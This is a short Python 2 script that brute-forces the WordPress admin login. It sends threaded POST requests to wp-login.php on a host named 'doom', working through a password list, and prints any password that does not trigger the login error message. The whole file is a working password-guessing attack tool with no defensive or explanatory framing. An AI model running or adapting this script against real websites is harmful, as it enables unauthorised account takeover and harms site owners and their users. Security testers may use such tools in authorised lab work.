#!/usr/bin/env python

import time
from threading import Thread
import requests
import itertools
import re
import sys

WAIT=0
THREADS = 20
PASSWORDS = "passwords.txt"
user = "admin"
regex = ur"<strong>ERROR</strong>"
url="http://doom:8000/wp-login.php"

def check_pass(passwords, threadNum):
	#print "%d" % (len(passwords))
	print "Worker #%d started." % (threadNum)

	for i in range(len(passwords)):
		payload = {'log':user, 'pwd':passwords[i],'wp-submit':'Log In'}
		#print "%d Trying: admin/%s" % (threadNum,passwords[i])
		r = requests.post(url,data=payload)
		match = re.search(regex,r.text)
		if match:
			#print "NO MATCH"
			pass
		else:
			print "MATCH FOUND:", passwords[i]
			return
		time.sleep(WAIT)
	print "Worker #%d finished." % (threadNum)


# how many lines are we dealing with?
num_lines = sum(1 for line in open(PASSWORDS))
# double open? FIXME
text_file = open(PASSWORDS,'r')
# sane array
lines = []

# read in each line, strip new line, append to array.
for index,text in enumerate(text_file):
	if 0 <= index <= num_lines:
		lines.append(text.strip("\n"))

# some lambda magic that splits array into chunks
chunks = lambda l, n: [l[x: x+n] for x in xrange(0,len(l), n)]
# chunky!
password_lines = chunks(lines, len(lines)/THREADS)
for i in range(len(password_lines)):
	print i,": ",len(password_lines[i])

# Fire off worker threads with each chunk.
print "[!] Starting Workers..."
for i in range(len(password_lines)):
	# send to thread
	t = Thread(target=check_pass, args=(password_lines[i],i,))
	t.start()
